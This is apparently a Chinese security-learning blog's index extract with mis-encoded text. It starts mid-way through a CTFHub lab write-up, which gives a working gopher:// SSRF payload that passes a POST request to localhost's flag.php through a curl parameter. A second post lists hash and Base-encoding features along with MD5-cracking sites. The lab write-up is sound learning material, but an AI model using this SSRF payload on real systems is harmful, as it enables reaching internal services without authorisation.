class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">POST</span>%<span class="number">2520</span>%<span class="number">252</span>Fflag.php%<span class="number">2520</span>HTTP%<span class="number">252</span>F1.<span class="number">1</span>%<span class="number">250</span>D%<span class="number">250</span>AHost%<span class="number">253</span>A%<span class="number">2520127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%<span class="number">253</span>A80%<span class="number">250</span>D%<span class="number">250</span>AContent-Length%<span class="number">253</span>A%<span class="number">252036</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">2520</span>%<span class="number">250</span>D%<span class="number">250</span>AContent-Type%<span class="number">253</span>A%<span class="number">2520</span>application%<span class="number">252</span>Fx-www-form-urlencoded%<span class="number">250</span>D%<span class="number">250</span>A%<span class="number">250</span>D%<span class="number">250</span>Akey%<span class="number">253</span>D11e053e2b7900523ac51fc7606b964e2</span><br></pre></td></tr></table></figure><p>ç„¶ååˆå› ä¸º<code>flag.php</code>é‡Œæœ‰<code>$_SERVER[&quot;REMOTE_ADDR&quot;]</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>] != <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Just View From 127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœç›´æ¥åœ¨è¾“å…¥æ¡†ï¼Œä¸Šä¼ POSTè¯·æ±‚åˆä¼šæ˜¾ç¤º</p><p><img src="/2022/07/27/CTFHub-wp/image-20220925222739689.png" alt="image-20220925222739689"></p><p>è¿™ä¸ªæƒ³ç»•è¿‡ï¼Œå°±åªæœ‰é€šè¿‡<code>index.php</code>çš„<code>curl</code>åŠŸèƒ½ï¼Œåˆ©ç”¨Gopheråè®®ä»<code>127.0.0.1</code>å‘ç›®æ ‡å‘é€<code>POST</code>è¯·æ±‚</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=gopher:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">80</span>/_POST%252<span class="number">0</span>%252Fflag.php%2520HTTP%252F1.<span class="number">1</span>%250D%250AHost%253A%2520127.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>%253A8<span class="number">0</span>%250D%250AContent-Length%253A%252036%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%252<span class="number">0</span>%250D%250AContent-Type%253A%2520application%252Fx-www-form-urlencoded%250D%250A%250D%250Akey%253D11e053e2b7900523ac51fc7606b964e2</span><br></pre></td></tr></table></figure><p><img src="/2022/07/27/CTFHub-wp/image-20220925232055769.png" alt="image-20220925232055769"></p><p>å¾—åˆ°flag</p>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é¶åœº </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŠ å¯†å¯†æ–‡ç‰¹å¾</title>
      <link href="/2022/07/21/Reverso-Context/"/>
      <url>/2022/07/21/Reverso-Context/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.51cto.com/u_15274949/2931589">åŸæ–‡é“¾æ¥</a></p><span id="more"></span><h2 id="1ã€MD5â€”â€”ç¤ºä¾‹"><a href="#1ã€MD5â€”â€”ç¤ºä¾‹" class="headerlink" title="1ã€MD5â€”â€”ç¤ºä¾‹"></a>1ã€MD5â€”â€”ç¤ºä¾‹</h2><p><u><strong>21232F297A57A5A743894A0E4A801FC3</strong></u></p><p>ä¸€èˆ¬MD5å€¼æ˜¯<u>32ä½</u>ç”±æ•°å­—<code>0-9</code>å’Œå­—æ¯<code>a-f</code>æ‰€ç»„æˆçš„å­—ç¬¦ä¸²ï¼Œå¦‚å›¾ã€‚<u>å¦‚æœå‡ºç°è¿™ä¸ªèŒƒå›´ä»¥å¤–çš„å­—ç¬¦è¯´æ˜è¿™å¯èƒ½æ˜¯ä¸ªé”™è¯¯çš„md5å€¼</u>ï¼Œå°±æ²¡å¿…è¦å†æ‹¿å»è§£å¯†äº†ã€‚16ä½å€¼æ˜¯å–çš„æ˜¯8~24ä½ã€‚</p><p><img src="/2022/07/21/Reverso-Context/image-20220721175149372.png" alt="image-20220721175149372"></p><p>md5çš„ä¸‰ä¸ªç‰¹å¾ï¼š</p><p>1.<strong>ç¡®å®šæ€§</strong>ï¼šä¸€ä¸ªåŸå§‹æ•°æ®çš„MD5å€¼æ˜¯å”¯ä¸€çš„ï¼ŒåŒä¸€ä¸ªåŸå§‹æ•°æ®ä¸å¯èƒ½ä¼šè®¡ç®—å‡ºå¤šä¸ªä¸åŒçš„MD5å€¼ã€‚</p><p>2.<strong>ç¢°æ’æ€§</strong>ï¼š<u>åŸå§‹æ•°æ®ä¸å…¶MD5å€¼å¹¶ä¸æ˜¯ä¸€ä¸€å¯¹åº”çš„</u>ï¼Œæœ‰å¯èƒ½å¤šä¸ªåŸå§‹æ•°æ®è®¡ç®—å‡ºæ¥çš„MD5å€¼æ˜¯ä¸€æ ·çš„ï¼Œè¿™å°±æ˜¯ç¢°æ’ã€‚</p><p>3.<strong>ä¸å¯é€†</strong>ï¼šä¹Ÿå°±æ˜¯è¯´å¦‚æœå‘Šè¯‰ä½ ä¸€ä¸ªMD5å€¼ï¼Œä½ æ˜¯æ— æ³•é€šè¿‡å®ƒè¿˜åŸå‡ºå®ƒçš„åŸå§‹æ•°æ®çš„ï¼Œè¿™ä¸æ˜¯ä½ çš„æŠ€æœ¯ä¸å¤Ÿç‰›ï¼Œè¿™æ˜¯ç”±å®ƒçš„ç®—æ³•æ‰€å†³å®šçš„ã€‚å› ä¸ºæ ¹æ®ç¬¬2ç‚¹ï¼Œ<u>ä¸€ä¸ªç»™å®šçš„MD5å€¼æ˜¯å¯èƒ½å¯¹åº”å¤šä¸ªåŸå§‹æ•°æ®çš„</u>ï¼Œå¹¶ä¸”ç†è®ºä¸Šè®²æ˜¯å¯ä»¥å¯¹åº”æ— é™å¤šä¸ªåŸå§‹æ•°æ®ï¼Œæ‰€æœ‰æ— æ³•ç¡®å®šåˆ°åº•æ˜¯ç”±å“ªä¸ªåŸå§‹æ•°æ®äº§ç”Ÿçš„ã€‚</p><h2 id="2ã€sha1â€”â€”ç¤ºä¾‹"><a href="#2ã€sha1â€”â€”ç¤ºä¾‹" class="headerlink" title="2ã€sha1â€”â€”ç¤ºä¾‹"></a>2ã€sha1â€”â€”ç¤ºä¾‹</h2><p><u><strong>d033e22ae348aeb5660fc2140aec35850c4da997</strong></u></p><p>è¿™ç§åŠ å¯†çš„å¯†æ–‡ç‰¹å¾è·ŸMD5å·®ä¸å¤šï¼Œåªä¸è¿‡<u>ä½æ•°æ˜¯40</u></p><p><img src="/2022/07/21/Reverso-Context/image-20220721175316568.png" alt="image-20220721175316568"></p><h2 id="3ã€HMACç®—æ³•â€”â€”ç¤ºä¾‹"><a href="#3ã€HMACç®—æ³•â€”â€”ç¤ºä¾‹" class="headerlink" title="3ã€HMACç®—æ³•â€”â€”ç¤ºä¾‹"></a>3ã€HMACç®—æ³•â€”â€”ç¤ºä¾‹</h2><p><u><strong>5b696ae7da9442ead7adc24d03cedb65</strong></u></p><p>HMAC (Hash-based Message Authentication Code) å¸¸ç”¨äºæ¥å£ç­¾åéªŒè¯ï¼Œè¿™ç§ç®—æ³•å°±æ˜¯åœ¨å‰ä¸¤ç§åŠ å¯†çš„åŸºç¡€ä¸Šå¼•å…¥äº†ç§˜é’¥ï¼Œè€Œç§˜é’¥åˆåªæœ‰ä¼ è¾“åŒæ–¹æ‰çŸ¥é“ï¼Œæ‰€ä»¥åŸºæœ¬ä¸Šæ˜¯ç ´è§£ä¸äº†çš„</p><p><img src="/2022/07/21/Reverso-Context/image-20220721175340163.png" alt="image-20220721175340163"></p><h2 id="4ã€NTLMâ€”â€”ç¤ºä¾‹"><a href="#4ã€NTLMâ€”â€”ç¤ºä¾‹" class="headerlink" title="4ã€NTLMâ€”â€”ç¤ºä¾‹"></a>4ã€NTLMâ€”â€”ç¤ºä¾‹</h2><p><u><strong>209c6174da490caeb422f3fa5a7ae634</strong></u></p><p>è¿™ç§åŠ å¯†æ˜¯Windowsçš„å“ˆå¸Œå¯†ç ï¼Œæ˜¯ Windows NT æ—©æœŸç‰ˆæœ¬çš„æ ‡å‡†å®‰å…¨åè®®ã€‚ä¸å®ƒç›¸åŒçš„è¿˜æœ‰Domain Cached Credentialsï¼ˆåŸŸå“ˆå¸Œï¼‰ã€‚</p><p><img src="/2022/07/21/Reverso-Context/image-20220721175431939.png" alt="image-20220721175431939"></p><h2 id="ç›¸ä¼¼åŠ å¯†ç±»å‹"><a href="#ç›¸ä¼¼åŠ å¯†ç±»å‹" class="headerlink" title="ç›¸ä¼¼åŠ å¯†ç±»å‹"></a>ç›¸ä¼¼åŠ å¯†ç±»å‹</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#    ç®—æ³•       é•¿åº¦</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">1</span> md5  <span class="number">32</span>/<span class="number">16</span></span><br><span class="line"><span class="attribute">2</span> sha1     <span class="number">40</span></span><br><span class="line"><span class="attribute">3</span> sha256     <span class="number">64</span></span><br><span class="line"><span class="attribute">4</span> sha512    <span class="number">128</span></span><br><span class="line"><span class="attribute">5</span> adler32  <span class="number">8</span></span><br><span class="line"><span class="attribute">6</span> crc32      <span class="number">8</span></span><br><span class="line"><span class="attribute">7</span> crc32b       <span class="number">8</span></span><br><span class="line"><span class="attribute">8</span> fnv132      <span class="number">8</span></span><br><span class="line"><span class="attribute">9</span> fnv164     <span class="number">16</span></span><br><span class="line"><span class="attribute">10</span> fnv1a32  <span class="number">8</span></span><br><span class="line"><span class="attribute">11</span> fnv1a64     <span class="number">16</span></span><br><span class="line"><span class="attribute">12</span> gost     <span class="number">64</span></span><br><span class="line"><span class="attribute">13</span> gost-crypto <span class="number">64</span></span><br><span class="line"><span class="attribute">14</span> haval128,<span class="number">3</span> <span class="number">32</span></span><br><span class="line"><span class="attribute">15</span> haval128,<span class="number">4</span> <span class="number">32</span></span><br><span class="line"><span class="attribute">16</span> haval128,<span class="number">5</span> <span class="number">32</span></span><br><span class="line"><span class="attribute">17</span> haval160,<span class="number">3</span> <span class="number">40</span></span><br><span class="line"><span class="attribute">18</span> haval160,<span class="number">4</span> <span class="number">40</span></span><br><span class="line"><span class="attribute">19</span> haval160,<span class="number">5</span> <span class="number">40</span></span><br><span class="line"><span class="attribute">20</span> haval192,<span class="number">3</span> <span class="number">48</span></span><br><span class="line"><span class="attribute">21</span> haval192,<span class="number">4</span> <span class="number">48</span></span><br><span class="line"><span class="attribute">22</span> haval192,<span class="number">5</span> <span class="number">48</span></span><br><span class="line"><span class="attribute">23</span> haval224,<span class="number">3</span> <span class="number">56</span></span><br><span class="line"><span class="attribute">24</span> haval224,<span class="number">4</span> <span class="number">56</span></span><br><span class="line"><span class="attribute">25</span> haval224,<span class="number">5</span> <span class="number">56</span></span><br><span class="line"><span class="attribute">26</span> haval256,<span class="number">3</span> <span class="number">64</span></span><br><span class="line"><span class="attribute">27</span> haval256,<span class="number">4</span> <span class="number">64</span></span><br><span class="line"><span class="attribute">28</span> haval256,<span class="number">5</span> <span class="number">64</span></span><br><span class="line"><span class="attribute">29</span> joaat      <span class="number">8</span></span><br><span class="line"><span class="attribute">30</span> md2          <span class="number">32</span></span><br><span class="line"><span class="attribute">31</span> md4      <span class="number">32</span></span><br><span class="line"><span class="attribute">32</span> ripemd128  <span class="number">32</span></span><br><span class="line"><span class="attribute">33</span> ripemd160  <span class="number">40</span></span><br><span class="line"><span class="attribute">34</span> ripemd256  <span class="number">64</span></span><br><span class="line"><span class="attribute">35</span> ripemd320  <span class="number">80</span></span><br><span class="line"><span class="attribute">36</span> sha224      <span class="number">56</span></span><br><span class="line"><span class="attribute">37</span> sha3-<span class="number">224</span>  <span class="number">56</span></span><br><span class="line"><span class="attribute">38</span> sha3-<span class="number">256</span>  <span class="number">64</span></span><br><span class="line"><span class="attribute">39</span> sha3-<span class="number">384</span>  <span class="number">96</span></span><br><span class="line"><span class="attribute">40</span> sha3-<span class="number">512</span>  <span class="number">128</span></span><br><span class="line"><span class="attribute">41</span> sha384       <span class="number">96</span></span><br><span class="line"><span class="attribute">42</span> sha512/<span class="number">224</span>   <span class="number">56</span></span><br><span class="line"><span class="attribute">43</span> sha512/<span class="number">256</span>  <span class="number">64</span></span><br><span class="line"><span class="attribute">44</span> snefru       <span class="number">64</span></span><br><span class="line"><span class="attribute">45</span> snefru256    <span class="number">64</span></span><br><span class="line"><span class="attribute">46</span> tiger128,<span class="number">3</span>  <span class="number">32</span></span><br><span class="line"><span class="attribute">47</span> tiger128,<span class="number">4</span>  <span class="number">32</span></span><br><span class="line"><span class="attribute">48</span> tiger160,<span class="number">3</span>   <span class="number">40</span></span><br><span class="line"><span class="attribute">49</span> tiger160,<span class="number">4</span>   <span class="number">40</span></span><br><span class="line"><span class="attribute">50</span> tiger192,<span class="number">3</span>  <span class="number">48</span></span><br><span class="line"><span class="attribute">51</span> tiger192,<span class="number">4</span>   <span class="number">48</span></span><br><span class="line"><span class="attribute">52</span> whirlpool  <span class="number">128</span></span><br><span class="line"><span class="attribute">53</span> mysql      è€MYSQLæ•°æ®åº“ç”¨çš„ï¼Œ<span class="number">16</span>ä½ï¼Œä¸”ç¬¬<span class="number">1</span>ä½å’Œç¬¬<span class="number">7</span>ä½å¿…é¡»ä¸º<span class="number">0</span>-<span class="number">8</span></span><br><span class="line"><span class="attribute">54</span> mysql5      <span class="number">40</span></span><br><span class="line"><span class="attribute">55</span> NTLM      <span class="number">32</span></span><br><span class="line"><span class="attribute">56</span> Domain Cached Credentials <span class="number">32</span></span><br></pre></td></tr></table></figure><h2 id="å¸¸ç”¨è§£å¯†ç½‘ç«™ï¼š"><a href="#å¸¸ç”¨è§£å¯†ç½‘ç«™ï¼š" class="headerlink" title="å¸¸ç”¨è§£å¯†ç½‘ç«™ï¼š"></a>å¸¸ç”¨è§£å¯†ç½‘ç«™ï¼š</h2><p><code>www.cmd5.comï¼ˆå¸¦æ‰¹é‡è§£å¯†å·¥å…·ï¼‰</code></p><p><code>www.somd5.com</code></p><p><code>cmd5.la</code></p><p><code>pmd5.com</code></p><p><code>www.ttmd5.comï¼ˆå¸¦æ‰¹é‡è§£å¯†å·¥å…·ï¼‰</code></p><hr><p><u>Base64ã€Base58ã€Base32ã€Base16ã€Base85ã€Base100ç­‰ç›¸ä¼¼åŠ å¯†ç±»å‹</u></p><h2 id="1ã€Base64â€”â€”ç¤ºä¾‹"><a href="#1ã€Base64â€”â€”ç¤ºä¾‹" class="headerlink" title="1ã€Base64â€”â€”ç¤ºä¾‹"></a>1ã€Base64â€”â€”ç¤ºä¾‹</h2><p><u><strong>YWRtaW4tcm9vdA&#x3D;&#x3D;</strong></u></p><p>ä¸€èˆ¬æƒ…å†µä¸‹å¯†æ–‡å°¾éƒ¨éƒ½ä¼šæœ‰ä¸¤ä¸ªç­‰å·ï¼Œæ˜æ–‡å¾ˆå°‘çš„æ—¶å€™åˆ™æ²¡æœ‰</p><p>Base64ç¼–ç è¦æ±‚æŠŠ3ä¸ª8ä½å­—èŠ‚ï¼ˆ38&#x3D;24ï¼‰è½¬åŒ–ä¸º4ä¸ª6ä½çš„å­—èŠ‚ï¼ˆ46&#x3D;24ï¼‰ï¼Œä¹‹ååœ¨6ä½çš„å‰é¢è¡¥ä¸¤ä¸ª0ï¼Œå½¢æˆ8ä½ä¸€ä¸ªå­—èŠ‚çš„å½¢å¼ã€‚å¦‚æœå‰©ä¸‹çš„å­—ç¬¦ä¸è¶³3ä¸ªå­—èŠ‚ï¼Œåˆ™ç”¨0å¡«å……ï¼Œè¾“å‡ºå­—ç¬¦ä½¿ç”¨â€˜&#x3D;â€™ï¼Œå› æ­¤ç¼–ç åè¾“å‡ºçš„æ–‡æœ¬æœ«å°¾å¯èƒ½ä¼šå‡ºç°1æˆ–2ä¸ªâ€˜&#x3D;â€™ï¼Œå¦‚å›¾ã€‚</p><p><img src="/2022/07/21/Reverso-Context/image-20220721180138424.png" alt="image-20220721180138424"></p><p>ä¸ºäº†ä¿è¯æ‰€è¾“å‡ºçš„ç¼–ç ä½å¯è¯»å­—ç¬¦ï¼ŒBase64åˆ¶å®šäº†ä¸€ä¸ªç¼–ç è¡¨ï¼Œä»¥ä¾¿è¿›è¡Œç»Ÿä¸€è½¬æ¢ã€‚ç¼–ç è¡¨çš„å¤§å°ä¸º2^6&#x3D;64ï¼Œè¿™ä¹Ÿæ˜¯Base64åç§°çš„ç”±æ¥ã€‚</p><p><img src="/2022/07/21/Reverso-Context/image-20220721180249541.png" alt="image-20220721180249541"></p><h3 id="Base64ä½¿ç”¨æ³¨æ„é—®é¢˜"><a href="#Base64ä½¿ç”¨æ³¨æ„é—®é¢˜" class="headerlink" title="Base64ä½¿ç”¨æ³¨æ„é—®é¢˜"></a>Base64ä½¿ç”¨æ³¨æ„é—®é¢˜</h3><h4 id="ä¸€ã€Base64å’ŒURLä¼ å‚é—®é¢˜"><a href="#ä¸€ã€Base64å’ŒURLä¼ å‚é—®é¢˜" class="headerlink" title="ä¸€ã€Base64å’ŒURLä¼ å‚é—®é¢˜"></a>ä¸€ã€Base64å’ŒURLä¼ å‚é—®é¢˜</h4><p>æ ‡å‡†çš„Base64å¹¶ä¸é€‚åˆç›´æ¥æ”¾åœ¨URLé‡Œä¼ è¾“ï¼Œå› ä¸ºURLç¼–ç å™¨ä¼šæŠŠæ ‡å‡†Base64ä¸­çš„â€œ&#x2F;â€å’Œâ€œ+â€å­—ç¬¦å˜ä¸ºå½¢å¦‚â€œ%XXâ€çš„å½¢å¼ï¼Œè€Œè¿™äº›â€œ%â€å·åœ¨å­˜å…¥æ•°æ®åº“æ—¶è¿˜éœ€è¦å†è¿›è¡Œè½¬æ¢ï¼Œå› ä¸ºANSI SQLä¸­å·²å°†â€œ%â€å·ç”¨ä½œé€šé…ç¬¦ã€‚</p><p>ä¸ºè§£å†³æ­¤é—®é¢˜ï¼Œå¯é‡‡ç”¨ä¸€ç§ç”¨äºURLçš„æ”¹è¿›Base64ç¼–ç ï¼Œå®ƒåœ¨æœ«å°¾å¡«å……â€™&#x3D;â€™å·ï¼Œå¹¶å°†æ ‡å‡†Base64ä¸­çš„â€œ+â€å’Œâ€œ&#x2F;â€åˆ†åˆ«æ”¹æˆäº†â€œ-â€å’Œâ€œ_â€ï¼Œè¿™æ ·å°±å…å»äº†åœ¨URLç¼–è§£ç å’Œæ•°æ®åº“å­˜å‚¨æ—¶æ‰€è¦ä½œçš„è½¬æ¢ï¼Œé¿å…äº†ç¼–ç ä¿¡æ¯é•¿åº¦åœ¨æ­¤è¿‡ç¨‹ä¸­çš„å¢åŠ ï¼Œå¹¶ç»Ÿä¸€äº†æ•°æ®åº“ã€è¡¨å•ç­‰å¤„å¯¹è±¡æ ‡è¯†ç¬¦çš„æ ¼å¼ã€‚</p><h4 id="äºŒã€Base64å’ŒURLä¼ å‚é—®é¢˜æ”¹å–„"><a href="#äºŒã€Base64å’ŒURLä¼ å‚é—®é¢˜æ”¹å–„" class="headerlink" title="äºŒã€Base64å’ŒURLä¼ å‚é—®é¢˜æ”¹å–„"></a>äºŒã€Base64å’ŒURLä¼ å‚é—®é¢˜æ”¹å–„</h4><p>å¦æœ‰ä¸€ç§ç”¨äºæ­£åˆ™è¡¨è¾¾å¼çš„æ”¹è¿›Base64å˜ç§ï¼Œå®ƒå°†â€œ+â€å’Œâ€œ&#x2F;â€æ”¹æˆäº†â€œ!â€å’Œâ€œ-â€ï¼Œå› ä¸ºâ€œ+â€,â€œ*â€ä»¥åŠå‰é¢åœ¨IRCuä¸­ç”¨åˆ°çš„â€œ[â€å’Œâ€œ]â€åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­éƒ½å¯èƒ½å…·æœ‰ç‰¹æ®Šå«ä¹‰ã€‚</p><p>æ­¤å¤–è¿˜æœ‰ä¸€äº›å˜ç§ï¼Œå®ƒä»¬å°†â€œ+&#x2F;â€æ”¹ä¸ºâ€œ-â€æˆ–â€œ.â€ï¼ˆç”¨ä½œç¼–ç¨‹è¯­è¨€ä¸­çš„æ ‡è¯†ç¬¦åç§°ï¼‰æˆ–â€œ.-â€ï¼ˆç”¨äºXMLä¸­çš„Nmtokenï¼‰ç”šè‡³â€œ_:â€ï¼ˆç”¨äºXMLä¸­çš„Nameï¼‰ã€‚</p><h4 id="ä¸‰ã€Base64è½¬æ¢åæ¯”åŸæœ‰çš„å­—ç¬¦ä¸²é•¿1-x2F-3"><a href="#ä¸‰ã€Base64è½¬æ¢åæ¯”åŸæœ‰çš„å­—ç¬¦ä¸²é•¿1-x2F-3" class="headerlink" title="ä¸‰ã€Base64è½¬æ¢åæ¯”åŸæœ‰çš„å­—ç¬¦ä¸²é•¿1&#x2F;3"></a>ä¸‰ã€Base64è½¬æ¢åæ¯”åŸæœ‰çš„å­—ç¬¦ä¸²é•¿1&#x2F;3</h4><p>Base64è¦æ±‚æŠŠæ¯ä¸‰ä¸ª8Bitçš„å­—èŠ‚è½¬æ¢ä¸ºå››ä¸ª6Bitçš„å­—èŠ‚ï¼ˆ38 &#x3D; 46 &#x3D; 24ï¼‰ï¼Œç„¶åæŠŠ6Bitå†æ·»ä¸¤ä½é«˜ä½0ï¼Œç»„æˆå››ä¸ª8Bitçš„å­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè½¬æ¢åçš„å­—ç¬¦ä¸²ç†è®ºä¸Šå°†è¦æ¯”åŸæ¥çš„é•¿1&#x2F;3ã€‚<br>å››ã€Base64è½¬æ¢æ€»ç»“</p><p>Base64è½¬æ¢ï¼Œæœ€å¥½æ˜¯ä¸è¦ç”¨åœ¨åŠ å¯†ä¸Šï¼Œå°¤å…¶æ˜¯å‚æ•°åŠ å¯†ï¼Œå¾ˆå®¹æ˜“å‡ºé—®é¢˜ã€‚</p><h2 id="2ã€Base58â€”â€”ç¤ºä¾‹"><a href="#2ã€Base58â€”â€”ç¤ºä¾‹" class="headerlink" title="2ã€Base58â€”â€”ç¤ºä¾‹"></a>2ã€Base58â€”â€”ç¤ºä¾‹</h2><p><u><strong>6tmHCZvhgfNjQu</strong></u></p><p>å®ƒæœ€å¤§çš„ç‰¹ç‚¹æ˜¯æ²¡æœ‰ç­‰å·</p><p>Base58æ˜¯ç”¨äºæ¯”ç‰¹å¸ï¼ˆBitcoinï¼‰ä¸­ä½¿ç”¨çš„ä¸€ç§ç‹¬ç‰¹çš„ç¼–ç æ–¹å¼ï¼Œä¸»è¦ç”¨äºäº§ç”ŸBitcoinçš„é’±åŒ…åœ°å€ã€‚</p><p>ç›¸æ¯”Base64ï¼ŒBase58ä¸ä½¿ç”¨æ•°å­—â€0â€ï¼Œå­—æ¯å¤§å†™â€Oâ€ï¼Œå­—æ¯å¤§å†™â€Iâ€ï¼Œå’Œå­—æ¯å°å†™â€lâ€ï¼Œä»¥åŠâ€+â€œå’Œâ€&#x2F;â€œç¬¦å·ã€‚</p><p>æ¯”ç‰¹å¸çš„Base58å­—æ¯è¡¨ï¼š</p><p>123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz</p><p>ç®€å•çš„è¯´ï¼šBase58ä¸€ç§ç¼–ç æ–¹å¼ï¼Œè·Ÿåè¿›åˆ¶ï¼Œåå…­è¿›åˆ¶ä¸€æ ·ï¼Œä¸è¿‡æ›´çŸ­æ›´çœç©ºé—´ã€‚</p><p>Base58çš„åŸç†æ˜¯ä»€ä¹ˆï¼Ÿ</p><p>äºŒè¿›åˆ¶ï¼š0å’Œ1</p><p>åè¿›åˆ¶ï¼š1åˆ°10</p><p>åå…­è¿›åˆ¶ï¼šåè¿›åˆ¶çš„åŸºç¡€ä¸ŠåŠ ä¸Šäº†A-F å…­ä¸ªå­—æ¯</p><p>Base58å¯ä»¥ç†è§£ä¸ºä¸€ç§58è¿›åˆ¶ã€‚</p><p>Base58åŒ…å«äº†é˜¿æ‹‰ä¼¯æ•°å­—ã€å°å†™è‹±æ–‡å­—æ¯ï¼Œå¤§å†™è‹±æ–‡å­—æ¯ã€‚</p><p>ä½†æ˜¯å»æ‰äº†ä¸€äº›å®¹æ˜“æ··æ·†çš„æ•°å­—å’Œå­—æ¯ï¼š0ï¼ˆæ•°å­—0ï¼‰ã€Oï¼ˆoçš„å¤§å†™å­—æ¯ï¼‰ã€lï¼ˆ Lçš„å°å†™å­—æ¯ï¼‰ã€Iï¼ˆiçš„å¤§å†™å­—æ¯ï¼‰</p><p><img src="/2022/07/21/Reverso-Context/image-20220721180316955.png" alt="image-20220721180316955"></p><h2 id="3ã€Base32â€”â€”ç¤ºä¾‹"><a href="#3ã€Base32â€”â€”ç¤ºä¾‹" class="headerlink" title="3ã€Base32â€”â€”ç¤ºä¾‹"></a>3ã€Base32â€”â€”ç¤ºä¾‹</h2><p><u><strong>GEZDGNBVGY3TQOJQGE&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</strong></u></p><p><u>ä»–çš„ç‰¹ç‚¹æ˜¯æ˜æ–‡è¶…è¿‡åä¸ªåé¢å°±ä¼šæœ‰å¾ˆå¤šç­‰å·</u></p><p>Base32ä½¿ç”¨äº†ASCIIç¼–ç ä¸­å¯æ‰“å°çš„<u>32ä¸ªå­—ç¬¦</u>(<strong>å¤§å†™</strong>å­—æ¯A-Zå’Œæ•°å­—2-7)å¯¹ä»»æ„å­—èŠ‚æ•°æ®è¿›è¡Œç¼–ç .Base32å°†ä¸²èµ·æ¥çš„äºŒè¿›åˆ¶æ•°æ®æŒ‰ç…§5ä¸ªäºŒè¿›åˆ¶ä½åˆ†ä¸ºä¸€ç»„ï¼Œç”±äºä¼ è¾“æ•°æ®çš„å•ä½æ˜¯å­—èŠ‚(å³8ä¸ªäºŒè¿›åˆ¶ä½).æ‰€ä»¥åˆ†å‰²ä¹‹å‰çš„äºŒè¿›åˆ¶ä½æ•°æ˜¯40çš„å€æ•°(40æ˜¯5å’Œ8çš„æœ€å°å…¬å€æ•°).å¦‚æœä¸è¶³40ä½ï¼Œåˆ™åœ¨ç¼–ç åæ•°æ®è¡¥å……â€&#x3D;â€ï¼Œä¸€ä¸ªâ€&#x3D;â€ç›¸å½“äºä¸€ä¸ªç»„(5ä¸ªäºŒè¿›åˆ¶ä½)ï¼Œç¼–ç åçš„æ•°æ®æ˜¯åŸå…ˆçš„8&#x2F;5å€.</p><p><img src="/2022/07/21/Reverso-Context/image-20220721180354078.png" alt="image-20220721180354078"></p><p>Base32å°†ä»»æ„å­—ç¬¦ä¸²æŒ‰ç…§å­—èŠ‚è¿›è¡Œåˆ‡åˆ†ï¼Œå¹¶å°†æ¯ä¸ªå­—èŠ‚å¯¹åº”çš„äºŒè¿›åˆ¶å€¼ï¼ˆä¸è¶³8æ¯”ç‰¹é«˜ä½è¡¥0ï¼‰ä¸²è”èµ·æ¥ï¼ŒæŒ‰ç…§5æ¯”ç‰¹ä¸€ç»„è¿›è¡Œåˆ‡åˆ†ï¼Œå¹¶å°†æ¯ç»„äºŒè¿›åˆ¶å€¼è½¬æ¢æˆåè¿›åˆ¶æ¥å¯¹åº”32ä¸ªå¯æ‰“å°å­—ç¬¦ä¸­çš„ä¸€ä¸ªã€‚</p><p><img src="/2022/07/21/Reverso-Context/image-20220721180407579.png" alt="image-20220721180407579"></p><p>ç”±äºæ•°æ®çš„äºŒè¿›åˆ¶ä¼ 